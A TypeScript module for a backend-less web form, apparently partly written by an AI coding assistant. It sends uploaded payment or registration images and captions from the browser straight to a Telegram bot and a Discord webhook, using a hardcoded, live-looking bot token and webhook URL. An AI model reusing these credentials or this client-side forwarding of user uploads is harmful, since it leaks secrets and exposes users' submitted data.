// Shared frontend-only submission helpers.
//
// This mirrors the sendToTelegram / sendToDiscord / failover logic that
// already lives inside PaymentFlow.astro's <script> block. It is pulled out
// here so the new Free Registration flow can reuse the exact same behavior
// without touching (or risking) the existing Payment flow.
//
// NOTE: PaymentFlow.astro was intentionally left untouched, so it still has
// its own inline copy of this same logic. If you'd like a single source of
// truth instead of two copies, the follow-up step is to update
// PaymentFlow.astro to import from this file too — but that was out of
// scope here since the brief said not to modify the Payment flow.
//
// SECURITY NOTE: because this project has no backend, the bot token and
// webhook URL below are visible to anyone who views page source or the
// network tab. That's an existing trade-off inherited from PaymentFlow.astro,
// not something introduced here — worth moving behind a server endpoint
// eventually.

export const TELEGRAM_BOT_TOKEN = "8966048043:AAFzEdXs0nwv_ycpeYECqKPgiBpi6P5xuok";
export const TELEGRAM_CHAT_ID = "8564033086";
export const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
export const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1529924194408726629/2LuY0lMrZuuIUEg3qE90O9piPVn-9jmNE4G_0Bu7ACMO18ZPSImzhwa4oD6cGP-kcYEL";

// Same timing rules as the Payment flow: each destination gets up to a full
// minute, and once one succeeds the other only gets a short grace window.
export const BASE_TIMEOUT_MS = 60000;
export const GRACE_MS = 30000;

export async function sendToTelegram(file: File, caption: string, signal: AbortSignal): Promise<boolean> {
  try {
    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_CHAT_ID);
    formData.append("caption", caption);
    formData.append("photo", file, file.name);

    const response = await fetch(TELEGRAM_API_URL, {
      method: "POST",
      body: formData,
      signal,
    });

    let result: { ok?: boolean; description?: string } = {};
    try {
      result = await response.json();
    } catch {
      // Non-JSON response — treated as a failure below.
    }

    if (!response.ok || !result.ok) {
      console.error("Telegram rejected submission:", response.status, result.description || result);
      return false;
    }
    return true;
  } catch (error) {
    console.error("Telegram submission failed (network/timeout):", error);
    return false;
  }
}

export async function sendToDiscord(file: File, caption: string, signal: AbortSignal): Promise<boolean> {
  try {
    const formData = new FormData();
    formData.append("payload_json", JSON.stringify({ content: caption }));
    formData.append("file", file, file.name);

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: formData,
      signal,
    });

    if (!response.ok) {
      const text = await response.text().catch(() => "");
      console.error("Discord rejected submission:", response.status, text);
      return false;
    }
    return true;
  } catch (error) {
    console.error("Discord submission failed (network/timeout):", error);
    return false;
  }
}

/**
 * Sends the same file+caption to Telegram (primary) and Discord (backup) in
 * parallel, exactly like the Payment flow's documentation-submit step.
 * Calls onFirstSuccess() the moment either destination accepts it, then lets
 * the other keep trying briefly in the background. Resolves to true if at
 * least one destination succeeded.
 */
export async function submitWithFailover(
  file: File,
  caption: string,
  onFirstSuccess: () => void
): Promise<boolean> {
  const telegramController = new AbortController();
  const discordController = new AbortController();
  const telegramTimer = setTimeout(() => telegramController.abort(), BASE_TIMEOUT_MS);
  const discordTimer = setTimeout(() => discordController.abort(), BASE_TIMEOUT_MS);

  let notified = false;
  function notifyOnce() {
    if (!notified) {
      notified = true;
      onFirstSuccess();
    }
  }

  const telegramPromise = sendToTelegram(file, caption, telegramController.signal).then((ok) => {
    clearTimeout(telegramTimer);
    if (ok) {
      notifyOnce();
      clearTimeout(discordTimer);
      setTimeout(() => discordController.abort(), GRACE_MS);
    }
    return ok;
  });

  const discordPromise = sendToDiscord(file, caption, discordController.signal).then((ok) => {
    clearTimeout(discordTimer);
    if (ok) {
      notifyOnce();
      clearTimeout(telegramTimer);
      setTimeout(() => telegramController.abort(), GRACE_MS);
    }
    return ok;
  });

  const [telegramOk, discordOk] = await Promise.all([telegramPromise, discordPromise]);
  return telegramOk || discordOk;
}

/** Fetches a static public asset (e.g. /free-joining.png) as a File so it can be attached like an upload. */
export async function fetchAssetAsFile(url: string, filename: string, mimeType = "image/png"): Promise<File> {
  const response = await fetch(url);
  const blob = await response.blob();
  return new File([blob], filename, { type: mimeType });
}

// Shared validators (same rules as the Payment flow's Your Information step).
export const isValidEmail = (value: string) => /^[^\s@]+@gmail\.com$/i.test(value.trim());
export const isValidPhone = (value: string) => /^\d{11}$/.test(value.trim());
export const isNonEmpty = (value: string) => value.trim().length > 0;
